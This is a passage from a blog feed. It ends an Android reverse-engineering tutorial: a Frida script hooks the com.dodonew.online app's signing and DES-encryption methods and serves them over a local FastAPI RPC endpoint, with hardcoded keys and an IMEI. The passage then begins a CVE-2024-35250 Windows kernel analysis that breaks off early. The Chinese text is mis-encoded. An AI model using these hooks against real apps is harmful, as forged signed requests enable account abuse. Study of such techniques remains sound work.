class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wrap_user_script</span>(<span class="params">name, script</span>):</span><br><span class="line">    <span class="keyword">if</span> script.startswith(<span class="string">&quot;ğŸ“¦\n&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> script</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Script.evaluate(<span class="subst">&#123;json.dumps(name)&#125;</span>, <span class="subst">&#123;json.dumps(script)&#125;</span>);&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_final_script</span>(<span class="params">raw_fragments</span>):</span><br><span class="line">    fragments = []</span><br><span class="line">    next_script_id = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> raw_fragment <span class="keyword">in</span> raw_fragments:</span><br><span class="line">        <span class="keyword">if</span> raw_fragment.startswith(<span class="string">&quot;ğŸ“¦\n&quot;</span>):</span><br><span class="line">            fragments.append(raw_fragment[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script_id = next_script_id</span><br><span class="line">            next_script_id += <span class="number">1</span></span><br><span class="line">            size = <span class="built_in">len</span>(raw_fragment.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            fragments.append(<span class="string">f&quot;<span class="subst">&#123;size&#125;</span> /frida/repl-<span class="subst">&#123;script_id&#125;</span>.js\nâœ„\n<span class="subst">&#123;raw_fragment&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ğŸ“¦\n&quot;</span> + <span class="string">&quot;\nâœ„\n&quot;</span>.join(fragments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_java_bridge</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æŸ¥æ‰¾Javaæ¡¥æ¥å™¨æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> <span class="built_in">reversed</span>(sys.path):</span><br><span class="line">        <span class="keyword">if</span> path.endswith(<span class="string">&#x27;site-packages&#x27;</span>):</span><br><span class="line">            bridge_path = os.path.join(path, <span class="string">&#x27;frida_tools&#x27;</span>, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">                <span class="keyword">return</span> bridge_path</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¦‚æœæ‰¾ä¸åˆ°ï¼Œå°è¯•å…¶ä»–å¯èƒ½çš„è·¯å¾„</span></span><br><span class="line">    <span class="keyword">import</span> frida_tools</span><br><span class="line">    frida_tools_path = os.path.dirname(frida_tools.__file__)</span><br><span class="line">    bridge_path = os.path.join(frida_tools_path, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">        <span class="keyword">return</span> bridge_path</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> FileNotFoundError(<span class="string">&quot;æ‰¾ä¸åˆ°Javaæ¡¥æ¥å™¨æ–‡ä»¶ï¼Œè¯·ç¡®ä¿frida-toolså·²æ­£ç¡®å®‰è£…&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½ çš„JavaScriptä»£ç </span></span><br><span class="line">user_js_code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">function hookTest(username, passward)&#123;</span></span><br><span class="line"><span class="string">    var result;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var time = new Date().getTime();</span></span><br><span class="line"><span class="string">        time = &#x27;1759643230427&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var string = Java.use(&#x27;java.lang.String&#x27;);</span></span><br><span class="line"><span class="string">        var signData = string.$new(&#x27;equtype=ANDROID&amp;loginImei=Android352689080920725&amp;timeStamp=&#x27; + </span></span><br><span class="line"><span class="string">        time + &#x27;&amp;userPwd=&#x27; + passward + &#x27;&amp;username=&#x27; + username + &#x27;&amp;key=sdlkjsdljf0j2fsjk&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var Utils = Java.use(&#x27;com.dodonew.online.util.Utils&#x27;);</span></span><br><span class="line"><span class="string">        var sign = Utils.md5(signData).toUpperCase();</span></span><br><span class="line"><span class="string">        console.log(&#x27;sign: &#x27;, sign);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var encryptData = &#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;&#x27;+ </span></span><br><span class="line"><span class="string">        sign +&#x27;&quot;,&quot;timeStamp&quot;:&quot;&#x27;+ time +&#x27;&quot;,&quot;userPwd&quot;:&quot;&#x27; + passward + &#x27;&quot;,&quot;username&quot;:&quot;&#x27; + username + &#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var RequestUtil = Java.use(&#x27;com.dodonew.online.http.RequestUtil&#x27;);</span></span><br><span class="line"><span class="string">        var Encrypt = RequestUtil.encodeDesMap(encryptData, &#x27;65102933&#x27;, &#x27;32028092&#x27;);</span></span><br><span class="line"><span class="string">        console.log(&#x27;Encrypt: &#x27;, Encrypt);</span></span><br><span class="line"><span class="string">        result = Encrypt;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    return result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string">    s1nec1o: hookTest</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;message[<span class="string">&#x27;payload&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] ERROR: <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå®Œæ•´çš„è„šæœ¬</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># è¯»å–Javaæ¡¥æ¥å™¨</span></span><br><span class="line">    bridge_path = find_java_bridge()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(bridge_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        java_bridge = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ·»åŠ Javaåˆ°å…¨å±€å¯¹è±¡</span></span><br><span class="line">    java_bridge += <span class="string">&quot;\n\nObject.defineProperty(globalThis, &#x27;Java&#x27;, &#123; value: bridge &#125;);&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># åŒ…è£…ç”¨æˆ·è„šæœ¬</span></span><br><span class="line">    wrapped_script = wrap_user_script(<span class="string">&quot;hookTest&quot;</span>, user_js_code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ„å»ºæœ€ç»ˆè„šæœ¬</span></span><br><span class="line">    raw_fragments = [java_bridge, wrapped_script]</span><br><span class="line">    final_script = build_final_script(raw_fragments)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è„šæœ¬æ„å»ºæˆåŠŸ&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è„šæœ¬æ„å»ºå¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fridaè¿æ¥</span></span><br><span class="line">devices = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line">pid = devices.spawn(<span class="string">&#x27;com.dodonew.online&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;pid: <span class="subst">&#123;pid&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">process = devices.attach(pid)</span><br><span class="line">script = process.create_script(final_script)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">devices.resume(pid)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;åº”ç”¨å·²æ¢å¤æ‰§è¡Œ&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç­‰å¾…åº”ç”¨å®Œå…¨å¯åŠ¨</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ç­‰å¾…åº”ç”¨å®Œå…¨å¯åŠ¨...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/get_data&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getEchoApi</span>(<span class="params">item_id: <span class="built_in">str</span>, item_user: <span class="built_in">str</span>, item_pass: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¼€å§‹å¤„ç†è¯·æ±‚: user=<span class="subst">&#123;item_user&#125;</span>, pass=<span class="subst">&#123;item_pass&#125;</span>&quot;</span>)</span><br><span class="line">        result = script.exports_sync.s1nec1o(item_user, item_pass)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item_retval&quot;</span>: result&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_msg = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;RPCè°ƒç”¨é”™è¯¯: <span class="subst">&#123;error_msg&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error_msg, <span class="string">&quot;item_id&quot;</span>: item_id&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/status&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check_status</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;ready&quot;</span>, <span class="string">&quot;frida_version&quot;</span>: frida.__version__&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app=app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>å¢åŠ éƒ¨åˆ†çš„è¯¦ç»†è¯´æ˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrap_user_script</span>(<span class="params">name, script</span>):</span><br><span class="line">    <span class="keyword">if</span> script.startswith(<span class="string">&quot;ğŸ“¦\n&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> script</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Script.evaluate(<span class="subst">&#123;json.dumps(name)&#125;</span>, <span class="subst">&#123;json.dumps(script)&#125;</span>);&quot;</span></span><br></pre></td></tr></table></figure><p>å°†Jsä»£ç åŒ…è£…æˆfridaèƒ½è¯†åˆ«çš„æ ¼å¼ã€‚<code>Script.evaluate()</code>æ˜¯Fridaå†…éƒ¨ç”¨æ¥æ‰§è¡Œè„šæœ¬çš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">build_final_script</span><span class="params">(raw_fragments)</span>:</span><br><span class="line">    fragments = []</span><br><span class="line">    next_script_id = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> raw_fragment in raw_fragments:</span><br><span class="line">        <span class="keyword">if</span> raw_fragment.startswith(<span class="string">&quot;ğŸ“¦\n&quot;</span>):</span><br><span class="line">            fragments.append(raw_fragment[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script_id = next_script_id</span><br><span class="line">            next_script_id += <span class="number">1</span></span><br><span class="line">            size = len(raw_fragment.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            fragments.append(f<span class="string">&quot;&#123;size&#125; /frida/repl-&#123;script_id&#125;.js\nâœ„\n&#123;raw_fragment&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ğŸ“¦\n&quot;</span> + <span class="string">&quot;\nâœ„\n&quot;</span>.join(fragments)</span><br></pre></td></tr></table></figure><p>å°†å¤šä¸ªJavaScriptç‰‡æ®µï¼ˆJavaæ¡¥æ¥å™¨ + ä½ çš„ä»£ç ï¼‰ç»„åˆæˆä¸€ä¸ªå®Œæ•´çš„Fridaè„šæœ¬åŒ…ã€‚ğŸ“¦å’Œâœ„æ˜¯Fridaçš„å†…éƒ¨æ ‡è®°ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_java_bridge</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æŸ¥æ‰¾Javaæ¡¥æ¥å™¨æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> <span class="built_in">reversed</span>(sys.path):</span><br><span class="line">        <span class="keyword">if</span> path.endswith(<span class="string">&#x27;site-packages&#x27;</span>):</span><br><span class="line">            bridge_path = os.path.join(path, <span class="string">&#x27;frida_tools&#x27;</span>, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">                <span class="keyword">return</span> bridge_path</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å¦‚æœæ‰¾ä¸åˆ°ï¼Œå°è¯•å…¶ä»–å¯èƒ½çš„è·¯å¾„</span></span><br><span class="line">    <span class="keyword">import</span> frida_tools</span><br><span class="line">    frida_tools_path = os.path.dirname(frida_tools.__file__)</span><br><span class="line">    bridge_path = os.path.join(frida_tools_path, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">        <span class="keyword">return</span> bridge_path</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">raise</span> FileNotFoundError(<span class="string">&quot;æ‰¾ä¸åˆ°Javaæ¡¥æ¥å™¨æ–‡ä»¶ï¼Œè¯·ç¡®ä¿frida-toolså·²æ­£ç¡®å®‰è£…&quot;</span>)</span><br></pre></td></tr></table></figure><p>è‡ªåŠ¨æŸ¥æ‰¾ç³»ç»Ÿä¸­å®‰è£…çš„Javaæ¡¥æ¥å™¨æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†è®©<code>Java.perform()</code>å·¥ä½œæ‰€éœ€çš„æ‰€æœ‰ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºå®Œæ•´çš„è„šæœ¬</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># è¯»å–Javaæ¡¥æ¥å™¨</span></span><br><span class="line">    bridge_path = find_java_bridge()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(bridge_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        java_bridge = f.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ·»åŠ Javaåˆ°å…¨å±€å¯¹è±¡</span></span><br><span class="line">    java_bridge += <span class="string">&quot;\n\nObject.defineProperty(globalThis, &#x27;Java&#x27;, &#123; value: bridge &#125;);&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åŒ…è£…ç”¨æˆ·è„šæœ¬</span></span><br><span class="line">    wrapped_script = wrap_user_script(<span class="string">&quot;hookTest&quot;</span>, user_js_code)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æ„å»ºæœ€ç»ˆè„šæœ¬</span></span><br><span class="line">    raw_fragments = [java_bridge, wrapped_script]</span><br><span class="line">    final_script = build_final_script(raw_fragments)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è„šæœ¬æ„å»ºæˆåŠŸ&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è„šæœ¬æ„å»ºå¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ol><li>è¯»å–Javaæ¡¥æ¥å™¨: ä»<code>frida_tools/bridges/java.js</code>è¯»å–Javaæ¡¥æ¥å™¨ä»£ç </li><li>æ³¨å†ŒJavaå¯¹è±¡: æ·»åŠ <code>Object.defineProperty(globalThis, &#39;Java&#39;, &#123; value: bridge &#125;);</code>ï¼Œè¿™è¡Œä»£ç è®©Javaå¯¹è±¡åœ¨å…¨å±€å¯ç”¨</li><li>åŒ…è£…ä½ çš„è„šæœ¬: å°†ä½ çš„<code>JavaScript</code>ä»£ç åŒ…è£…æˆ<code>Frida</code>æ ¼å¼</li><li>ç»„åˆè„šæœ¬: å°†<code>Java</code>æ¡¥æ¥å™¨å’Œä½ çš„ä»£ç ç»„åˆæˆæœ€ç»ˆè„šæœ¬</li></ol><p><a href="http://127.0.0.1:8000/get_data?item_id=1&item_user=12345678901&item_pass=123456789">http://127.0.0.1:8000/get_data?item_id=1&amp;item_user=12345678901&amp;item_pass=123456789</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;item_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;item_retval&quot;</span><span class="punctuation">:</span><span class="string">&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD\nbmIP0xrIL98xsKTOSbgIWuEhruHgPtMk8UaM2X3bIN17yS34xTmxUQlfDaRFr4d1eIV2+Kn2vl2z\n8dbq+kB0AY2H+3lKAmUDzuRngtxIqaZHS9MIBv9sErGLqpABUb9MgTOmjljk+33RaMn5gSx6PQKy\nQN2xZw4=\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ç»“æœï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;Encrypt&quot;</span><span class="punctuation">:</span><span class="string">&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\/\/FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT\/FXC+BMD\nbmIP0xrIL98xsKTOSbgIWuEhruHgPtMk8UaM2X3bIN17yS34xTmxUQlfDaRFr4d1eIV2+Kn2vl2z\n8dbq+kB0AY2H+3lKAmUDzuRngtxIqaZHS9MIBv9sErGLqpABUb9MgTOmjljk+33RaMn5gSx6PQKy\nQN2xZw4=\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç»“æœç›¸ç­‰~~~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åªåšå­¦ä¹ è®°å½•çš„å¤‡ä»½ï¼Œæ¥è‡ªäº&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-273293.htm</summary>
      
    
    
    
    <category term="å®‰å“é€†å‘" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-35250å¤ç°</title>
    <link href="http://s1nec-1o.github.io/2025/09/05/CVE-2024-35250%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2025/09/05/CVE-2024-35250%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-09-05T13:13:44.000Z</published>
    <updated>2025-09-05T13:20:02.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2024-35250åˆ†æ"><a href="#CVE-2024-35250åˆ†æ" class="headerlink" title="CVE-2024-35250åˆ†æ"></a>CVE-2024-35250åˆ†æ</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/">https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/</a></p><p>æœ¬ç¯‡æ–‡ç« åªåšå­¦ä¹ è®°å½•ï¼Œå¯¹ä¸€äº›ä¸ç†è§£çš„æ¦‚å¿µè¿›è¡Œäº†è¡¥å……</p><h2 id="Kernel-Streamingç®€å•ä»‹ç»"><a href="#Kernel-Streamingç®€å•ä»‹ç»" class="headerlink" title="Kernel Streamingç®€å•ä»‹ç»"></a>Kernel Streamingç®€å•ä»‹ç»</h2><p><em>Kernel Streaming</em>ï¼ˆKSï¼‰ æ˜¯æŒ‡ Microsoft æä¾›çš„æœåŠ¡ï¼Œè¿™äº›æœåŠ¡æ”¯æŒæµå¼å¤„ç†æ•°æ®çš„å†…æ ¸æ¨¡å¼å¤„ç†ã€‚</p><p>Kernel Streaming ä¸­ï¼Œæä¾›äº†ä¸‰ç§å¤šåª’ä½“é©±åŠ¨æ¨¡å‹ï¼š<em>port class</em>ã€<em>AVStream</em> å’Œ <em>stream class</em>ã€‚</p><p>è¿™äº›ç±»é©±åŠ¨ç¨‹åºåœ¨ç³»ç»Ÿæ–‡ä»¶ <em>portcls.sys</em>ã€<em>stream.sys</em> å’Œ <em>ks.sys</em> ï¼ˆä¹Ÿç§°ä¸º <em>AVStream</em>ï¼‰ ä¸­ä½œä¸ºå¯¼å‡ºé©±åŠ¨ç¨‹åº ï¼ˆå†…æ ¸æ¨¡å¼ DLLï¼‰ å®ç°ã€‚</p><p>å¤§å¤šæ•°ç”¨äºPCI å’ŒDMA å‹éŸ³æ•ˆè£…ç½®çš„ç¡¬ä½“é©±åŠ¨ç¨‹å¼ï¼Œå®ƒå¤„ç†ä¸éŸ³è®¯ç›¸å…³çš„æ•°æ®ä¼ è¾“ï¼Œä¾‹å¦‚éŸ³é‡æ§åˆ¶ã€éº¦å…‹é£è¾“å…¥ç­‰ç­‰ï¼Œä¸»è¦ä¼šä½¿ç”¨åˆ°çš„å…ƒä»¶å‡½å¼åº“ä¼šæ˜¯portcls.sysã€‚</p><p>ä¸»è¦ä»‹ç»port class å’ŒAVStream</p><h3 id="Port-Class"><a href="#Port-Class" class="headerlink" title="Port Class"></a>Port Class</h3><p>ç”±å¾®è½¯æä¾›ç«¯å£é©±åŠ¨ï¼ˆPort Driverï¼‰ï¼Œå¤„ç†é€šç”¨éŸ³é¢‘åŠŸèƒ½ï¼ˆå¦‚æ··éŸ³ã€æ ¼å¼è½¬æ¢ï¼‰ã€‚ç¡¬ä»¶å‚å•†åªéœ€å®ç°å¾®å‹ç«¯å£é©±åŠ¨ï¼ˆMiniport Driverï¼‰ï¼Œä¸“æ³¨äºç¡¬ä»¶æ§åˆ¶ã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116852.png" alt="image-20250902200915023" style="zoom:50%;" /><h3 id="AVStream"><a href="#AVStream" class="headerlink" title="AVStream"></a>AVStream</h3><p>é€‚ç”¨äºè§†é¢‘é‡‡é›†ã€æµåª’ä½“å¤„ç†ï¼ˆå¦‚æ‘„åƒå¤´ã€è§†é¢‘æ•è·å¡ï¼‰</p><p>å–ä»£äº†æ—§ç‰ˆ <strong>KSï¼ˆKernel Streamingï¼‰</strong> æ¡†æ¶ï¼Œæä¾›æ›´ç°ä»£çš„é©±åŠ¨æ¨¡å‹ã€‚</p><p>æ”¯æŒå³æ’å³ç”¨ï¼ˆPnPï¼‰ã€ç”µæºç®¡ç†ï¼Œç®€åŒ–äº†è¿‡æ»¤å™¨ï¼ˆFilterï¼‰å’Œç®¡è„šï¼ˆPinï¼‰çš„å®ç°ã€‚</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116854.png" alt="image-20250902201053716" style="zoom:50%;" /><h2 id="è®¾å¤‡äº¤äº’"><a href="#è®¾å¤‡äº¤äº’" class="headerlink" 